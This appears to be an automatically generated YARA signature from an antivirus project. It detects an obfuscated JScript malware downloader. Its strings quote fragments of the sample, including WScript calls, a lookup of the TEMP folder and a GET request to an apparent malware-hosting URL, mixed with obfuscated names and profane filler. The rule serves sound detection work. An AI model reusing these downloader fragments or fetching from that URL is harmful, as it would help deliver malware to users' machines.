rule sig_20160428_08438bcfb62c32b51a5610ed9b012ddc {
  meta:
    description = "datamaliciousorder - file 20160428_08438bcfb62c32b51a5610ed9b012ddc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3647f3b04a0efe7527915df19df3cea5a61030681c94108c77495f1f12035d7f"

  strings:
    $s1  = "function ZfbMcpBsqFhcUnmHikRpx(QkcWowUntYhaQpmBtkPgk){NpuYxeOqaDabTbrOyrWmu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function VdsBluDceFqxZhlWeqVnc() {return NpuYxeOqaDabTbrOyrWmu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function ZfbMcpBsqFhcUnmHikRpx(QkcWowUntYhaQpmBtkPgk){NpuYxeOqaDabTbrOyrWmu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return YgrFnkJxzUyiAbfEixOcq - UieKbxGteZarQraRtgSwz;};" fullword ascii
    $s5  = "function SysQwcUzfAjgJklEzbDbz(YgrFnkJxzUyiAbfEixOcq, UieKbxGteZarQraRtgSwz){NsrCndXcwJvuTwaZhrBon = NsrCndXcwJvuTwaZhrBon * 1; " ascii
    $s6  = "var NpuYxeOqaDabTbrOyrWmu = function WmqJkwGueHccXpjBvzYqn() {return SklYoxWleLiwWrdCkiOkk[DebJhqLnpIwoUhkQubKtc](\"WScript\"+\"" ascii
    $s7  = "IlbHpdDheNlvZylJexVnb[XffYznGssFykYwaCdiJns](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "function JloPhqDvpDnnLcmWxvPmx(){return SjbInnTmqBqdQeaYeaBjn + \"\";};" fullword ascii
    $s9  = "var SklYoxWleLiwWrdCkiOkk = this[\"WScript\"];" fullword ascii
    $s10 = "var NpuYxeOqaDabTbrOyrWmu = function WmqJkwGueHccXpjBvzYqn() {return SklYoxWleLiwWrdCkiOkk[DebJhqLnpIwoUhkQubKtc](\"WScript\"+\"" ascii
    $s11 = "function VdsBluDceFqxZhlWeqVnc() {return NpuYxeOqaDabTbrOyrWmu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (IlbHpdDheNlvZylJexVnb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function SysQwcUzfAjgJklEzbDbz(YgrFnkJxzUyiAbfEixOcq, UieKbxGteZarQraRtgSwz){NsrCndXcwJvuTwaZhrBon = NsrCndXcwJvuTwaZhrBon * 1; " ascii
    $s14 = "function IivHevKenYqxUevQjlNlz() {return ((TexMkvGffBjqAguDxmHnu == true) && (TexMkvGffBjqAguDxmHnu == IkzTegRekYswQckQseCsc)) ?" ascii
    $s15 = "function IivHevKenYqxUevQjlNlz() {return ((TexMkvGffBjqAguDxmHnu == true) && (TexMkvGffBjqAguDxmHnu == IkzTegRekYswQckQseCsc)) ?" ascii
    $s16 = "function QtlBfqRfdPujBsqLwuGnb(){return 23;};" fullword ascii
    $s17 = "function IwcVeoQdxLfhMqsCuvQlb(HrxWhtOgmUxaHvxGbnJqq) {var GftVsaWzxLawXpxJsyXeo = (1, 2, 3, 4, 5, HrxWhtOgmUxaHvxGbnJqq); retur" ascii
    $s18 = "IkzTegRekYswQckQseCsc = true; " fullword ascii
    $s19 = "}while (ExlUmkVzbAooExxMsfLwn);" fullword ascii
    $s20 = "var WswMauCtuMxxSqoRjmUoc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}